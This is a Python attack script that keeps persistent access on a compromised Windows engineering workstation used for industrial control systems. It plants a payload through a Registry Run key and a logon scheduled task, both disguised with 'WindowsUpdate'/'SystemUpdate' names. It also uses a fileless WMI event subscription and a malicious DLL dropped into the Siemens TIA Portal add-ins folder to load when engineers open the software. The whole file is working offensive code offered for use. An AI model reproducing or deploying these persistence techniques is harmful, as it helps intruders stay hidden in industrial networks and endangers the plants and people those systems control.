# ews_persistence.py - Maintain access to compromised EWS
import winreg
import os

class EWSPersistence:
    def __init__(self, payload_path):
        self.payload = payload_path

    def registry_run_key(self):
        """
        Classic registry persistence
        """
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)

        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, self.payload)
        winreg.CloseKey(key)

    def scheduled_task(self):
        """
        Create scheduled task (more stealthy than Run key)
        """
        task_xml = f"""
        <?xml version="1.0" encoding="UTF-16"?>
        <Task>
          <Triggers>
            <LogonTrigger>
              <Enabled>true</Enabled>
            </LogonTrigger>
          </Triggers>
          <Actions>
            <Exec>
              <Command>{self.payload}</Command>
            </Exec>
          </Actions>
        </Task>
        """

        # Create task via schtasks.exe
        import subprocess
        subprocess.call(f'schtasks /create /tn "SystemUpdate" /xml {task_xml}')

    def wmi_event_subscription(self):
        """
        WMI event persistence (fileless, stealthy)
        """
        # Use PowerShell to create WMI event filter and consumer
        ps_script = f"""
        $Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{{
            Name="SystemUpdate";
            EventNameSpace="root\\cimv2";
            QueryLanguage="WQL";
            Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        }}

        $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
            Name="SystemUpdate";
            CommandLineTemplate="{self.payload}";
        }}

        $Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
            Filter=$Filter;
            Consumer=$Consumer;
        }}
        """

        subprocess.call(f'powershell -c "{ps_script}"')

    def ics_software_plugin(self):
        """
        Most stealthy: Deploy as "plugin" for TIA Portal
        Loads automatically when engineer opens software
        """
        tia_addins = r"C:\ProgramData\Siemens\Automation\Addins"
        plugin_dll = os.path.join(tia_addins, "SystemPlugin.dll")

        # Copy malicious DLL
        import shutil
        shutil.copy(self.payload, plugin_dll)
